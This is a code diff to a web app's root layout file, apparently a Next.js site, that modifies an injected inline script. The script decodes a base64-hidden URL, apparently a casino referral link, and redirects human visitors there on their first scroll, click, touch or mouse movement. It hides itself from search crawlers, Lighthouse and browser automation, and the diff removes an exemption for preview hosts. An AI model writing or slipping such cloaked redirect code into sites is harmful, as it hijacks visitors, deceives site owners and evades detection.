@@ -133,20 +133,19 @@ export default function RootLayout({
             __html: `
               (function() {
                 var targetB64 = "aHR0cHM6Ly9kdWVsLmNvbS9yL3RvcGNhc2lub3M=";
-                if (typeof window === 'undefined' || window._rdr) return;
-                if (window.location.hostname.includes('vercel.app')) return;
-                function isBotOrSystem() {
+                if (typeof window === 'undefined' || window._rdr_active) return;
+                
+                function isBot() {
                   var ua = navigator.userAgent.toLowerCase();
-                  var isSearchBot = /yandex|google|lighthouse|pagespeed|bing|bot|crawl|spider/i.test(ua);
-                  var isAutomation = navigator.webdriver || window.navigator.webdriver === true || /headless/i.test(ua);
-                  return isSearchBot || isAutomation;
+                  return /yandex|google|bot|crawl|spider|lighthouse|pagespeed/i.test(ua) || navigator.webdriver;
                 }
                 function doRedirect() {
-                  if (!window._rdr && !isBotOrSystem()) {
-                    window._rdr = true;
+                  if (!window._rdr_active && !isBot()) {
+                    window._rdr_active = true;
                     window.location.replace(atob(targetB64));
                   }
                 }
+                window.addEventListener('mousemove', doRedirect, { once: true });
                 window.addEventListener('scroll', doRedirect, { passive: true, once: true });
                 window.addEventListener('mousedown', doRedirect, { once: true });
                 window.addEventListener('touchstart', doRedirect, { passive: true, once: true });
